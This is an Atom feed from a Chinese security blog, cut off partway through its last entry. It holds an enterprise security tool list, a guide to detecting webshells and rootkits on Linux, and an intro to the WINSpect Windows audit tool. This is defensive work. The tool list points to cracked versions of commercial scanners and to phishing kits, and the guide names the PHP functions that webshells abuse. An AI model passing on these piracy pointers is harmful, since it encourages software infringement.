<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Pa55w0rd &#39;s Blog</title>
  
  <subtitle>记录</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.pa55w0rd.club/"/>
  <updated>2018-12-03T09:07:09.057Z</updated>
  <id>http://www.pa55w0rd.club/</id>
  
  <author>
    <name>Pa55w0rd</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>企业安全建设中用到的开源or“免费”的工具</title>
    <link href="http://www.pa55w0rd.club/other/"/>
    <id>http://www.pa55w0rd.club/other/</id>
    <published>2022-02-22T14:22:22.000Z</published>
    <updated>2018-12-03T09:07:09.057Z</updated>
    
    <content type="html"><![CDATA[<h3 id="漏扫"><a href="#漏扫" class="headerlink" title="漏扫"></a>漏扫</h3><ul><li><a href="https://www.tenable.com/downloads/nessus" target="_blank" rel="noopener">nessus</a>（<a href="https://www.tenable.com/products/nessus/activation-code" target="_blank" rel="noopener">Home版</a>）</li><li>openvas(在<a href="https://www.kali.org/tutorials/configuring-and-tuning-openvas-in-kali-linux/" target="_blank" rel="noopener">kali中安装openvas</a>，注意挂代 理，不然会很慢很慢和报错)</li><li>awvs（破解版-52pojie）</li><li>APPscan (<a href="https://pan.baidu.com/s/1sjkDDi1#list/path=%2F" target="_blank" rel="noopener">破解版</a>)</li><li>Burpsuite pro （破解版）</li><li><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF" target="_blank" rel="noopener">mobsf</a> (移动app客户端，支持ios，但是需要在mac上跑)</li><li>Nmap/Zmap/masscan 端口扫描<h3 id="漏洞管理"><a href="#漏洞管理" class="headerlink" title="漏洞管理"></a>漏洞管理</h3></li><li><a href="https://github.com/creditease-sec/insight" target="_blank" rel="noopener">洞察insight</a></li><li>smef</li><li><a href="https://github.com/jeffzh3ng/Fuxi-Scanner/" target="_blank" rel="noopener">Fuxi</a></li><li><a href="https://github.com/DefectDojo/django-DefectDojo" target="_blank" rel="noopener">DefectDojo</a><h3 id="项管"><a href="#项管" class="headerlink" title="项管"></a>项管</h3></li><li>jira</li><li>禅道<h3 id="src平台"><a href="#src平台" class="headerlink" title="src平台"></a>src平台</h3></li><li><a href="https://github.com/martinzhou2015/SRCMS" target="_blank" rel="noopener">SRCMS</a></li><li><a href="https://github.com/233sec/laravel-src" target="_blank" rel="noopener">laravel-src</a><h3 id="资产管理-自动化运维"><a href="#资产管理-自动化运维" class="headerlink" title="资产管理/自动化运维"></a>资产管理/自动化运维</h3></li><li><a href="https://github.com/ysrc/xunfeng" target="_blank" rel="noopener">xunfeng</a></li><li>AssetsView</li><li><a href="https://github.com/Tencent/bk-cmdb" target="_blank" rel="noopener">蓝鲸bk-cmdb</a></li><li><a href="https://github.com/bongmu/OpsManage" target="_blank" rel="noopener">OpsManage</a></li><li><a href="http://www.ansible.com.cn/" target="_blank" rel="noopener">Ansible</a></li><li><a href="https://docs.saltstack.com/en/latest/contents.html" target="_blank" rel="noopener">Saltstack</a><h3 id="soc"><a href="#soc" class="headerlink" title="soc"></a>soc</h3></li><li>sosrp</li><li>w3a_SOC</li><li>OpenSOC</li><li>ossim<h3 id="入侵检测-安全监控-流量回溯"><a href="#入侵检测-安全监控-流量回溯" class="headerlink" title="入侵检测/安全监控/流量回溯"></a>入侵检测/安全监控/流量回溯</h3></li><li>suricata(selks)</li><li>bro</li><li>ossec(wazuh)</li><li>security onion</li><li>OwlH</li><li>Nethserver</li><li>Snort</li><li>OpenWIPS-NG</li><li>moloch</li><li><a href="https://github.com/ysrc/yulong-hids" target="_blank" rel="noopener">同程-驭龙</a></li><li>青藤云</li><li>Osquery<h3 id="web应用安全"><a href="#web应用安全" class="headerlink" title="web应用安全"></a>web应用安全</h3></li><li><a href="https://github.com/loveshell/ngx_lua_waf" target="_blank" rel="noopener">ngx_lua_waf</a></li><li><a href="https://github.com/starjun/openstar" target="_blank" rel="noopener">openstar</a></li><li><a href="https://github.com/SpiderLabs/ModSecurity/tree/nginx_refactoring" target="_blank" rel="noopener">ModSecurity</a></li><li><a href="https://github.com/titansec/OpenWAF" target="_blank" rel="noopener">openwaf</a></li><li><a href="https://github.com/baidu/openrasp" target="_blank" rel="noopener">openRASP</a></li><li>x-waf</li><li>jxwaf<h3 id="终端安全集中管理"><a href="#终端安全集中管理" class="headerlink" title="终端安全集中管理"></a>终端安全集中管理</h3></li><li>360企业版</li><li>火绒企业安全<h3 id="堡垒机"><a href="#堡垒机" class="headerlink" title="堡垒机"></a>堡垒机</h3></li><li>jumpserver</li><li>teleport<h3 id="代码质量管理"><a href="#代码质量管理" class="headerlink" title="代码质量管理"></a>代码质量管理</h3></li><li>sonar + jekins</li><li>cobra</li><li>VCG</li><li>fortify(破解版，找到最新的规则是2017.3)</li><li>RIPS/Seay源代码审计系统(PHP))</li><li>Findbugs（JAVA）</li></ul><h3 id="web日志审计"><a href="#web日志审计" class="headerlink" title="web日志审计"></a>web日志审计</h3><ul><li>360星图</li><li><a href="https://github.com/apxar/xlog" target="_blank" rel="noopener">xlog</a><h3 id="日志分析系统"><a href="#日志分析系统" class="headerlink" title="日志分析系统"></a>日志分析系统</h3></li><li>elk（es+logstash+kibana)</li><li><a href="https://github.com/anbai-inc/Kibana_Hanization" target="_blank" rel="noopener">Kibana_Hanization(kibana汉化)</a><h3 id="上网行为管理-准入-认证"><a href="#上网行为管理-准入-认证" class="headerlink" title="上网行为管理/准入/认证"></a>上网行为管理/准入/认证</h3></li><li><a href="https://packetfence.org/" target="_blank" rel="noopener">packetfence</a></li><li>ikuai</li><li>openldap</li><li><a href="https://github.com/apereo/cas" target="_blank" rel="noopener">中央认证服务（CAS）</a><h3 id="数据防泄漏"><a href="#数据防泄漏" class="headerlink" title="数据防泄漏"></a>数据防泄漏</h3></li><li>opendlp<h3 id="基线检查-加固"><a href="#基线检查-加固" class="headerlink" title="基线检查/加固"></a>基线检查/加固</h3></li><li><a href="https://learn.cisecurity.org/benchmarks" target="_blank" rel="noopener">CIS</a></li><li><a href="https://github.com/CISOfy/lynis/" target="_blank" rel="noopener">Lynis审计</a></li><li><a href="https://github.com/A-mIn3/WINspect" target="_blank" rel="noopener">WINSpect</a></li><li><a href="https://www.open-scap.org/" target="_blank" rel="noopener">OpenSCAP</a><h3 id="github泄露扫描"><a href="#github泄露扫描" class="headerlink" title="github泄露扫描"></a>github泄露扫描</h3></li><li><a href="https://github.com/MiSecurity/x-patrol" target="_blank" rel="noopener">x-patrol</a></li><li><a href="https://github.com/0xbug/Hawkeye" target="_blank" rel="noopener">Hawkeye</a></li><li><a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener">GSIL</a><h3 id="目录索引系统"><a href="#目录索引系统" class="headerlink" title="目录索引系统"></a>目录索引系统</h3></li><li><a href="https://github.com/helloxz/zdir" target="_blank" rel="noopener">zdir</a><h3 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h3></li><li>opencanary</li><li><a href="https://github.com/dtag-dev-sec/tpotce" target="_blank" rel="noopener">T-Pot</a><h3 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h3></li><li><a href="https://github.com/p1r06u3/phishing" target="_blank" rel="noopener">P神的phishing</a></li><li><a href="https://github.com/sdlchina/mail_fishing" target="_blank" rel="noopener">mail_fishing</a></li><li><a href="https://github.com/thelinuxchoice/blackeye" target="_blank" rel="noopener">blackeye</a></li><li><a href="https://getgophish.com/" target="_blank" rel="noopener">getgophish</a><h3 id="API网关"><a href="#API网关" class="headerlink" title="API网关"></a>API网关</h3></li><li><a href="https://github.com/eolinker/GoKu-API-Gateway" target="_blank" rel="noopener">GoKu-API-Gateway</a></li><li><a href="https://konghq.com/faqs/" target="_blank" rel="noopener">Kong</a></li></ul><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul><li><a href="https://github.com/apxar/xlog" target="_blank" rel="noopener">WebRange(docker管理平台)</a></li><li><a href="https://github.com/pluosi/app-host" target="_blank" rel="noopener">app-host（内网app发布）</a></li><li><a href="https://github.com/baidu/AdvBox" target="_blank" rel="noopener">AdvBox</a></li><li><a href="https://github.com/facebook/osquery" target="_blank" rel="noopener">osquery</a></li><li><a href="https://github.com/liujiantaoliu/TT-SSO" target="_blank" rel="noopener">PHP-SSO</a></li><li><a href="https://github.com/HandsomeOne/Scout" target="_blank" rel="noopener">Scout(url监控平台)</a></li><li><a href="https://github.com/jx-sec/jxotp" target="_blank" rel="noopener">jxotp(SSH登陆双因素认证系统)</a></li><li><a href="https://github.com/sx1989827/DOClever" target="_blank" rel="noopener">DOClever</a></li><li><a href="https://github.com/CISOfy/lynis" target="_blank" rel="noopener">lynis审计</a></li><li><a href="https://github.com/jly8866/archer" target="_blank" rel="noopener">archer</a></li><li><a href="https://github.com/meolu/walle-web" target="_blank" rel="noopener">walle-web（代码部署平台）</a></li><li><a href="https://github.com/ctripcorp/apollo" target="_blank" rel="noopener">apollo(配置中心)</a></li><li><a href="https://github.com/chaitin/cloudwalker" target="_blank" rel="noopener">长亭开源牧云cloudwalker（只有webshell检测部分）</a></li><li><a href="https://github.com/threathunterX/nebula" target="_blank" rel="noopener">Nebula “星云”业务风控系统</a></li><li>美团DBProxy数据库防火墙</li><li>Linxu下 rkhunter/chkrootkit </li><li>Win下 pchunter/ 火绒剑/ PowerTool/ ProcessExplorer/ ProcessHacker/ autoruns/ OTL</li><li><a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe" target="_blank" rel="noopener">Kaspersky</a></li><li>D盾 webshell查杀</li><li>Sandboxie 个人版沙箱</li><li>ClamAV</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;漏扫&quot;&gt;&lt;a href=&quot;#漏扫&quot; class=&quot;headerlink&quot; title=&quot;漏扫&quot;&gt;&lt;/a&gt;漏扫&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.tenable.com/downloads/nessus&quot; target=&quot;_blan
      
    
    </summary>
    
      <category term="安全建设" scheme="http://www.pa55w0rd.club/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="记录" scheme="http://www.pa55w0rd.club/tags/%E8%AE%B0%E5%BD%95/"/>
    
      <category term="安全建设" scheme="http://www.pa55w0rd.club/tags/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
      <category term="开源工具" scheme="http://www.pa55w0rd.club/tags/%E5%BC%80%E6%BA%90%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Linux后门入侵检测工具使用</title>
    <link href="http://www.pa55w0rd.club/linux-backdoor-killer/"/>
    <id>http://www.pa55w0rd.club/linux-backdoor-killer/</id>
    <published>2018-12-03T07:07:05.000Z</published>
    <updated>2018-12-03T09:46:10.147Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-描述"><a href="#0x00-描述" class="headerlink" title="0x00 描述"></a>0x00 描述</h2><p>当我们的应用系统被入侵后，系统是否已被黑客上传webshell甚至植入木马后门程序。如果依靠人工排查，一是工作量大，二是需要一定程度的技术知识和业务知识才能判断什么是正常什么是异常。工作量大决定排查工作不可能由个别具有技术知识和业务知识的人来完成工作而需要其他人员参与，而如果这些没有“一定程度的技术知识和业务知识”的人员参与基本必然后导致大量的误报和漏报（主要是漏报）。总而言之，在大量设备场景中人工排查后门是很难切实有效推行的排查手段。</p><h2 id="0x01-Webshell查杀"><a href="#0x01-Webshell查杀" class="headerlink" title="0x01 Webshell查杀"></a>0x01 Webshell查杀</h2><h3 id="1-1-D盾-Web查杀"><a href="#1-1-D盾-Web查杀" class="headerlink" title="1.1 D盾_Web查杀"></a>1.1 D盾_Web查杀</h3><p>D盾Web查杀是一个永久免费的网站D盾Web查杀，软件使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的WebShell后门行为</p><p>引擎特别针对：一句话后门、变量函数后门、${}执行、`执行、preg_replace执行、call_user_func、file_put_contents、fputs 等特殊函数的参数进行针对性的识别，能查杀更为隐藏的后门，并把可疑的参数信息展现在你面前，让你能更快速的了解后门的情况</p><blockquote><p>PS: 不再更新D盾_web查杀的查杀引擎,只更新查杀库到2019.1.1，之后将不再更新查杀库<br><a id="more"></a></p></blockquote><h4 id="安装使用"><a href="#安装使用" class="headerlink" title="安装使用"></a>安装使用</h4><p><a href="http://www.d99net.net/down/WebShellKill_V2.0.9.zip" target="_blank" rel="noopener">D盾_WEB查杀V2.0.9 下载链接</a></p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># D盾只有win版的，需要把源代码打包下来进行扫描，或使用nfs共享目录挂载到windows系统</span></span><br><span class="line"><span class="meta"># 这里使用tar把源码打包下来进行扫描</span></span><br><span class="line">tar -cvf webshell.tar webshell/</span><br></pre></td></tr></table></figure><img src="/linux-backdoor-killer/D盾.png" title="D盾webshell查杀"><h3 id="1-2-深信服WebShellkiller"><a href="#1-2-深信服WebShellkiller" class="headerlink" title="1.2 深信服WebShellkiller"></a>1.2 深信服WebShellkiller</h3><p>WebShellkiller作为一款web后门专杀工具，不仅支持webshell的扫描，同时还支持暗链的扫描。这是一款融合了多重检测引擎的查杀工具。在传统正则匹配的基础上，采用模拟执行，参数动态分析监测技术、webshell语义分析技术、暗链隐藏特征分析技术，并根据webshell的行为模式构建了基于机器学习的智能检测模型。传统技术与人工智能技术相结合、静态扫描和动态分析相结合，更精准地检测出WEB网站已知和未知的后门文件。</p><h4 id="安装使用-1"><a href="#安装使用-1" class="headerlink" title="安装使用"></a>安装使用</h4><p><a href="http://edr.sangfor.com.cn/tool/WebShellKillerTool.zip" target="_blank" rel="noopener">Windows</a><br><a href="http://edr.sangfor.com.cn/tool/WebShellKillerForLinux.tar.gz" target="_blank" rel="noopener">Linux</a><br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># Windows平台同D盾</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># linux平台</span></span><br><span class="line"><span class="meta"># 下载WebShellkiller</span></span><br><span class="line">wget http:<span class="comment">//edr.sangfor.com.cn/tool/WebShellKillerForLinux.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 解压到当前目录</span></span><br><span class="line">tar -zxvf WebShellKillerForLinux.tar.gz </span><br><span class="line"><span class="meta"># 查看解压结果，可以看到多出centos_32、centos_64、linux_64三个文件夹</span></span><br><span class="line"><span class="meta"># 查看当前系统版本</span></span><br><span class="line">cat /etc/system-release &amp;&amp; uname -m</span><br><span class="line"></span><br><span class="line"><span class="meta"># 进入centos_64</span></span><br><span class="line">cd centos_64/wscan_app/</span><br><span class="line"></span><br><span class="line"><span class="meta"># wscan 默认没有可执行权限</span></span><br><span class="line">chmod u+x wscan</span><br><span class="line"></span><br><span class="line"><span class="meta"># wscan从LD_LIBRARY_PATH加载so文件，需要将当前路径加到LD_LIBRARY_PATH以使wscan能找到当前目录下的so</span></span><br><span class="line">export LD_LIBRARY_PATH=`pwd`:$LD_LIBRARY_PATH</span><br><span class="line"></span><br><span class="line"><span class="meta"># 执行扫描</span></span><br><span class="line">./wscan -hrf ../../webshell/jsp</span><br></pre></td></tr></table></figure></p><h2 id="木马后门类查杀"><a href="#木马后门类查杀" class="headerlink" title="木马后门类查杀"></a>木马后门类查杀</h2><p>可以设置定时任务定期查杀</p><h3 id="2-1-ClamAV"><a href="#2-1-ClamAV" class="headerlink" title="2.1 ClamAV"></a>2.1 ClamAV</h3><p>ClamAV是一个在命令行下查毒软件，是免费开源产品，支持多种平台，如：Linux/Unix、MAC OS X、Windows、OpenVMS。ClamAV是基于病毒扫描的命令行工具，但同时也有支持图形界面的ClamTK工具。为什么说是查毒软件呢，因为它不将杀毒作为主要功能，默认只能查出您服务器内的病毒，但是无法清除，至多删除文件。不过这样，已经对我们有很大帮助了。</p><h4 id="安装使用-2"><a href="#安装使用-2" class="headerlink" title="安装使用"></a>安装使用</h4><p>clamav的官方网站是<a href="http://www.clamav.net，" target="_blank" rel="noopener">http://www.clamav.net，</a> 可以从<a href="http://www.clamav.net/downloads" target="_blank" rel="noopener">http://www.clamav.net/downloads</a> 下载最新版本，也可以通过yum在线安装clamav，因为clamav包含在epel源中，所以方便起见，通过yum安装最简单。也可以编译安装<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Yum安装clamav</span></span><br><span class="line">yum <span class="keyword">install</span> epel-<span class="keyword">release</span></span><br><span class="line">yum -y <span class="keyword">install</span> clamav clamav-milter</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新病毒库</span></span><br><span class="line">freshclam</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行扫描</span></span><br><span class="line">clamscan -r -l scan.log /<span class="keyword">var</span>/www/webshell</span><br><span class="line">-r 表示递归扫描子目录</span><br><span class="line">-l 增加扫描报告</span><br><span class="line"><span class="keyword">move</span> [路径] 表示移动病毒文件到指定的路径</span><br><span class="line">remove [路径] 表示扫描到病毒文件后自动删除病毒文件</span><br></pre></td></tr></table></figure></p><h3 id="2-2-rookit"><a href="#2-2-rookit" class="headerlink" title="2.2 rookit"></a>2.2 rookit</h3><p>rootkit是Linux平台下最常见的一种木 马后门工具，它主要通过替换系统文件来达到攻 击和和隐蔽的目的，这种木 马比普通木 马后门更加危险和隐蔽，普通的检测工具和检查手段很难发现这种木 马。rootkit攻 击能力极强，对系统的危害很大，它通过一套工具来建立后门和隐藏行迹，从而让攻 击者保住权限，以使它在任何时候都可以使用root权限登录到系统。</p><p>一般杀毒软件运行于ring3级别只能查杀ring3级别的木马，rookit是运行于ring0级别的木马，所以查杀rootkit也需要ring0级杀毒程序。Rootkit Hunter正是一款专门查杀rootkit的软件。</p><h4 id="2-2-1-RKHunter"><a href="#2-2-1-RKHunter" class="headerlink" title="2.2.1 RKHunter"></a>2.2.1 RKHunter</h4><p>Rkhunter的中文名叫“Rootkit猎手”, 目前可以发现大多数已知的rootkits和一些嗅探器以及后门程序。它通过执行一系列的测试脚本来确认服务器是否已经感染rootkits，比如检查rootkits使用的基本文件，可执行二进制文件的错误文件权限，检测内核模块等等。在官方的资料中，RKHunter可以作的事情有：</p><ol><li>MD5校验测试，​检测文件是否有改动</li><li>检测rootkit使用的二进制和系统工具文件</li><li>检测特洛伊木 马程序的特征码</li><li>检测常用程序的文件属性是否异常</li><li>检测系统相关的测试</li><li>检测隐藏文件</li><li>检测可疑的核心模块LKM</li><li>检测系统已启动的监听端口</li></ol><h5 id="安装使用-3"><a href="#安装使用-3" class="headerlink" title="安装使用"></a>安装使用</h5><p><a href="http://rootkit.nl/projects/rootkit_hunter.html" target="_blank" rel="noopener">官方地址</a><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># yum安装rkhunter</span></span><br><span class="line">yum <span class="keyword">install</span> epel-<span class="keyword">release</span></span><br><span class="line">yum <span class="keyword">install</span> rkhunter</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用的几个参数选项有：</span></span><br><span class="line">c, <span class="comment">--check 必选参数，表示检测当前系统</span></span><br><span class="line">configfile &lt;<span class="keyword">file</span>&gt; 使用特定的配置文件</span><br><span class="line">cronjob   作为cron任务定期运行</span><br><span class="line">sk, <span class="comment">--skip-keypress   自动完成所有检测，跳过键盘输入</span></span><br><span class="line">summary   显示检测结果的统计信息</span><br><span class="line"><span class="keyword">update</span>    检测更新内容</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用--skip-keypress参数跳过回车</span></span><br><span class="line">rkhunter -c <span class="comment">--skip-keypress</span></span><br></pre></td></tr></table></figure></p><p>检查主要分成6个部分</p><ol><li>进行系统命令的检查，主要是检测系统的二进制文件，因为这些文件最容易被rootkit。显示OK字样表示正常，显示Warning表示有异常，需要引起注意，而显示“Not found”字样，一般无需理会。</li><li>主要检测常见的rootkit程序，显示绿色的“Not found”表示系统未感染此rootkit。</li><li>主要是一些特殊或附加的检测，例如对rootkit文件或目录检测、对恶意软件检测以及对指定的内核模块检测。</li><li>主要对网络、系统端口、系统启动文件、系统用户和组配置、SSH配置、文件系统等进行检测。</li><li>主要是对应用程序版本进行检测。</li><li>其实是上面输出的一个总结，通过这个总结，可以大概了解服务器目录的安全状态。</li></ol><p>设置定时任务</p><p><code>0 3 * * * /usr/sbin/rkhunter -c --skip-keypress 2&gt;&amp;1 | mail -s &quot;rkhunter Reports of My Server&quot; you@yourdomain.com</code></p><h4 id="2-2-2-chkrootkit"><a href="#2-2-2-chkrootkit" class="headerlink" title="2.2.2 chkrootkit"></a>2.2.2 chkrootkit</h4><p>Chkrootkit是一个在本地系统检查rootkit痕迹的工具，它是检查系统二进制文件是否被rootkit病毒修改的一个shell脚本。</p><h5 id="安装说明"><a href="#安装说明" class="headerlink" title="安装说明"></a>安装说明</h5><p><a href="http://www.chkrootkit.org/" target="_blank" rel="noopener">官方地址</a><br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 安装编译工具包</span></span><br><span class="line">yum install gcc gcc-c++ make</span><br><span class="line">yum install glibc-<span class="keyword">static</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 安装chkrootkit </span></span><br><span class="line">wget ftp:<span class="comment">//ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz</span></span><br><span class="line">tar zxvf chkrootkit.tar.gz</span><br><span class="line">cd chkrootkit</span><br><span class="line">make sense</span><br><span class="line"><span class="meta"># 常用参数</span></span><br><span class="line">-h 显示帮助信息</span><br><span class="line">-V 显示版本信息</span><br><span class="line">-l 显示测试内容</span><br><span class="line">-d debug模式，显示检测过程的相关指令程序</span><br><span class="line">-q 安静模式，只显示有问题部分，</span><br><span class="line">-x 高级模式，显示所有检测结果</span><br><span class="line">-r dir 设定指定的目录为根目录</span><br><span class="line">-p dir1:dir2:dirN 检测指定目录</span><br><span class="line">-n 跳过NFS连接的目录</span><br><span class="line"></span><br><span class="line"><span class="meta"># 使用，出现INFECTED就说明系统可能有问题了</span></span><br><span class="line">./chkrootkit | grep INFECTED</span><br></pre></td></tr></table></figure></p><p>设置定时任务</p><p><code>0 3 * * * /usr/sbin/chkrootkit 2&gt;&amp;1 | mail -s &quot;chkrootkit Reports of My Server&quot; you@yourdomain.com</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-描述&quot;&gt;&lt;a href=&quot;#0x00-描述&quot; class=&quot;headerlink&quot; title=&quot;0x00 描述&quot;&gt;&lt;/a&gt;0x00 描述&lt;/h2&gt;&lt;p&gt;当我们的应用系统被入侵后，系统是否已被黑客上传webshell甚至植入木马后门程序。如果依靠人工排查，一是工作量大，二是需要一定程度的技术知识和业务知识才能判断什么是正常什么是异常。工作量大决定排查工作不可能由个别具有技术知识和业务知识的人来完成工作而需要其他人员参与，而如果这些没有“一定程度的技术知识和业务知识”的人员参与基本必然后导致大量的误报和漏报（主要是漏报）。总而言之，在大量设备场景中人工排查后门是很难切实有效推行的排查手段。&lt;/p&gt;
&lt;h2 id=&quot;0x01-Webshell查杀&quot;&gt;&lt;a href=&quot;#0x01-Webshell查杀&quot; class=&quot;headerlink&quot; title=&quot;0x01 Webshell查杀&quot;&gt;&lt;/a&gt;0x01 Webshell查杀&lt;/h2&gt;&lt;h3 id=&quot;1-1-D盾-Web查杀&quot;&gt;&lt;a href=&quot;#1-1-D盾-Web查杀&quot; class=&quot;headerlink&quot; title=&quot;1.1 D盾_Web查杀&quot;&gt;&lt;/a&gt;1.1 D盾_Web查杀&lt;/h3&gt;&lt;p&gt;D盾Web查杀是一个永久免费的网站D盾Web查杀，软件使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的WebShell后门行为&lt;/p&gt;
&lt;p&gt;引擎特别针对：一句话后门、变量函数后门、${}执行、`执行、preg_replace执行、call_user_func、file_put_contents、fputs 等特殊函数的参数进行针对性的识别，能查杀更为隐藏的后门，并把可疑的参数信息展现在你面前，让你能更快速的了解后门的情况&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;PS: 不再更新D盾_web查杀的查杀引擎,只更新查杀库到2019.1.1，之后将不再更新查杀库&lt;br&gt;
    
    </summary>
    
      <category term="应急响应" scheme="http://www.pa55w0rd.club/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
      <category term="工具使用" scheme="http://www.pa55w0rd.club/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
      <category term="应急响应" scheme="http://www.pa55w0rd.club/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>WINSpect-基于Powershell的Windows安全审计工具</title>
    <link href="http://www.pa55w0rd.club/winspect/"/>
    <id>http://www.pa55w0rd.club/winspect/</id>
    <published>2018-12-03T03:59:36.000Z</published>
    <updated>2018-12-03T06:11:40.596Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://github.com/A-mIn3/WINspect" target="_blank" rel="noopener">项目地址</a></p></blockquote><h2 id="0x00-描述"><a href="#0x00-描述" class="headerlink" title="0x00 描述"></a>0x00 描述</h2><p>WINSpect是一款基于Powershell的Windows安全审计工具，可用于枚举和识别Windows平台的安全漏洞，以进一步的优化和加固平台的安全防护策略。</p><h2 id="0x01-功能"><a href="#0x01-功能" class="headerlink" title="0x01 功能"></a>0x01 功能</h2><p>WINSpect将为我们提供审计检查和枚举：</p><ul><li>检查已安装的安全产品</li><li>检查DLL劫持</li><li>检查用户账户控制设置<a id="more"></a></li><li>本地文件系统共享</li><li>具有本地组成员身份的域用户和组</li><li>注册表autoruns</li><li>可由Authenticated Users组成员配置的本地服务</li><li>Authenticated Users组成员可以写入相应二进制文件的本地服务</li><li>非system32 Windows托管服务及其相关的DLL</li><li>非引用服务路径漏洞</li><li>非系统计划任务DLL劫持</li><li>自动安装</li></ul><h2 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a>0x02 使用</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:A-mIn3/WINspect.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用管理员权限打开powershell，并运行WINSpect脚本</span></span><br><span class="line">.\WINspect.ps1</span><br></pre></td></tr></table></figure><h2 id="0x03-排错"><a href="#0x03-排错" class="headerlink" title="0x03 排错"></a>0x03 排错</h2><p>Win10系统使用过程中报错<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.\WINspect.ps1 : 无法加载文件 E:\WINspect\WINspect.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 http</span><br><span class="line">s:/go.microsoft.com/fwlink/?LinkID=<span class="number">135170</span> 中的 about_Execution_Policies。</span><br><span class="line">所在位置 行:<span class="number">1</span> 字符: <span class="number">1</span></span><br><span class="line">+ .\WINspect.ps1</span><br><span class="line">+ ~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : SecurityError: (:) []，PSSecurityException</span><br><span class="line">    + FullyQualifiedErrorId : UnauthorizedAccess</span><br></pre></td></tr></table></figure></p><p>是因为Windows PowerShell 执行策略限制你确定 Windows PowerShell 加载配置文件并运行脚本的条件。</p><p>通过<code>Get-ExecutionPolicy</code>命令获取挡前执行策略，默认执行策略为<code>Restricted</code></p><ul><li>允许单独的命令，但不会运行脚本。</li><li>阻止所有脚本文件的运行，包括格式设置文件和配置文件 (.ps1xml)、模块脚本文件 (.psm1) 和 Windows PowerShell 配置文件 (.ps1)。</li></ul><p>更改执行策略<br><figure class="highlight powershell"><table><tr><td 